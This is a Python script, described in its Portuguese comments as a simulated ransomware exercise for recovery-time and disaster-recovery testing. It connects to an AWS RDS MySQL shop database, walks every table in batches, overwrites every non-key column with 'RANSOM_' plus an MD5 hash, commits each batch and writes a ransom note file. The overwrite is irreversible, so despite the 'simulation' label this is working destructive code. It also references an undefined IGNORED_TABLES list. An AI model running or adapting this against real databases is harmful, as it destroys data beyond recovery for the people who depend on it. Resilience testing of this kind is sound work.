import boto3
import pymysql
import random
from datetime import datetime
import time
import hashlib
from dotenv import load_dotenv
import os


# CONFIGURAÇÕES


RANSOM_NOTE_FILE = "/home/ubuntu/shopee/README_RECOVER_FILES.txt"
LOG_FILE = "/home/ubuntu/shopee/rto_all_tables_log.txt"

BATCH_SIZE = 20000
SLEEP_SECONDS = 0.5
MAX_ITER = 100000

# CONEXÃO COM RDS


load_dotenv()

db_host = boto3.client("ssm", region_name="us-east-1").get_parameter(
    Name="/app/db/endpoint", WithDecryption=False)['Parameter']['Value']
DB_USER = os.getenv("DB_USER")
DB_PASSWORD = os.getenv("DB_PASSWORD")
DB_NAME = os.getenv("DB_NAME")


connection = pymysql.connect(
    host=db_host,
    user=DB_USER,
    password=DB_PASSWORD,
    database=DB_NAME,
    charset='utf8mb4',
    cursorclass=pymysql.cursors.DictCursor,
    autocommit=False
)


# UTILITÁRIOS


def log(msg):
    with open(LOG_FILE, "a") as f:
        f.write(f"[{datetime.now()}] {msg}\n")
    print(msg)


def create_ransom_note():
    note = f"""
================= RANSOMWARE SIMULADO =================

TODOS OS DADOS DO BANCO FORAM CORROMPIDOS (SIMULAÇÃO)

Objetivo: análise de RTO/DRP

Data: {datetime.now()}


"""
    with open(RANSOM_NOTE_FILE, "w") as f:
        f.write(note)


# TABELAS


def get_all_tables(cursor):
    cursor.execute("""
        SELECT TABLE_NAME
        FROM INFORMATION_SCHEMA.TABLES
        WHERE TABLE_SCHEMA = 'db_shop'
    """)
    return [r["TABLE_NAME"] for r in cursor.fetchall()]


# COLUNAS


def get_table_columns(cursor, table_name):
    cursor.execute("""
        SELECT COLUMN_NAME, COLUMN_KEY
        FROM INFORMATION_SCHEMA.COLUMNS
        WHERE TABLE_SCHEMA = 'db_shop'
        AND TABLE_NAME = %s
    """, (table_name,))

    rows = cursor.fetchall()

    pk = None
    columns = []

    for r in rows:
        col = r["COLUMN_NAME"]
        columns.append(col)

        if r["COLUMN_KEY"] == "PRI":
            pk = col

    return pk, columns


# IDS


def get_min_max(cursor, table, pk):
    cursor.execute(f"SELECT MIN({pk}) mn, MAX({pk}) mx FROM {table}")
    r = cursor.fetchone()

    if not r["mn"] or not r["mx"]:
        return None, None

    return int(r["mn"]), int(r["mx"])


def generate_ids(min_id, max_id, qty):
    try:
        return random.sample(range(min_id, max_id + 1), min(qty, (max_id - min_id + 1)))
    except ValueError:
        return []


def filter_existing(cursor, table, pk, ids):
    fmt = ",".join(["%s"] * len(ids))
    sql = f"SELECT {pk} FROM {table} WHERE {pk} IN ({fmt})"
    cursor.execute(sql, ids)
    return [r[pk] for r in cursor.fetchall()]


# "CRIPTOGRAFIA" SIMULADA


def fake_encrypt(value):
    if value is None:
        return "RANSOM_NULL"
    h = hashlib.md5(str(value).encode()).hexdigest()[:16]
    return f"RANSOM_{h}"


# UPDATE MASSIVO


def update_batch(cursor, table, pk, columns, ids):
    set_clause = []

    for col in columns:
        if col == pk:
            continue

        set_clause.append(
            f"{col} = CONCAT('RANSOM_', MD5(COALESCE({col}, 'NULL')))"
        )

    sql = f"""
        UPDATE {table}
        SET {', '.join(set_clause)}
        WHERE {pk} IN ({','.join(['%s'] * len(ids))})
    """

    cursor.execute(sql, ids)
    return cursor.rowcount


# ATAQUE POR TABELA


def attack_table(cursor, table):
    log(f"\n>>> ATAQUE NA TABELA: {table}")

    pk, columns = get_table_columns(cursor, table)

    if not pk:
        log(f"[SKIP] sem PK: {table}")
        return 0

    min_id, max_id = get_min_max(cursor, table, pk)

    if min_id is None:
        log(f"[SKIP] vazia: {table}")
        return 0

    total = 0
    processed = set()

    for i in range(MAX_ITER):

        ids = generate_ids(min_id, max_id, BATCH_SIZE * 2)
        ids = [x for x in ids if x not in processed]

        if not ids:
            break

        valid = filter_existing(cursor, table, pk, ids)
        batch = valid[:BATCH_SIZE]

        if not batch:
            break

        updated = update_batch(cursor, table, pk, columns, batch)
        connection.commit()

        processed.update(batch)
        total += updated

        log(f"[{table}] batch={len(batch)} updated={updated} total={total}")

        time.sleep(SLEEP_SECONDS)

    log(f">>> FINAL {table}: {total}")
    return total


# MAIN

create_ransom_note()

log("[RANSOMWARE] START")

try:
    with connection:
        with connection.cursor() as cursor:

            tables = get_all_tables(cursor)
            log(f"[INFO] tables: {tables}")

            # Embaralhar a ordem das tabelas para maior aleatoriedade
            random.shuffle(tables)
            log(f"[INFO] ordem embaralhada: {tables}")

            total_global = 0

            for t in tables:

                if t in IGNORED_TABLES:
                    log(f"[HONEYPOT IGNORED] {t}")
                    continue

                total_global += attack_table(cursor, t)

            log("=" * 50)
            log(f"[DONE] total affected: {total_global}")
            log("=" * 50)

except Exception as e:
    log(f"[ERROR] {e}")
    connection.rollback()

finally:
    connection.close()
